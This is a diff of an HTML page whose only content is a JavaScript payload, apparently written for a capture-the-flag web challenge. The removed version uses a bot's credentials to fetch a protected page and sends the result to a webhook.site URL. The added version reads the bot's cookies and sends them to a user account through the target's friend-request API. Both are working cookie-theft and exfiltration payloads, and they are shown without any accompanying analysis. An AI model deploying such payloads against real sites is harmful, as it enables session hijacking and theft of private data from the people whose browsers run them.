@@ -1,25 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
     <script>
-        // Делаем запрос на секретную страницу Кранга
-        // Браузер бота автоматически отправит его cookies
-        fetch('http://158.160.184.159:13002/kraang/brain', {
-            credentials: 'include'  // Отправляет cookies бота
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Отправляем содержимое страницы на webhook
-            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334? flag=' + encodeURIComponent(data));
-        })
-        .catch(error => {
-            // Если есть ошибка CORS, отправляем информацию об ошибке
-            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334? error=' + encodeURIComponent(error));
+        // Получаем все cookies бота
+        const cookies = document.cookie;
+        
+        // Отправляем запрос в друзья с cookies в message
+        fetch('http://158.160.184.159:13002/api/friendship/request', {
+            method: 'POST',
+            credentials: 'include',  // Отправляет cookies бота для авторизации
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                to_user: "MrKustic",
+                message: cookies
+            })
         });
     </script>
-    <p>Loading...</p>
 </body>
 </html>
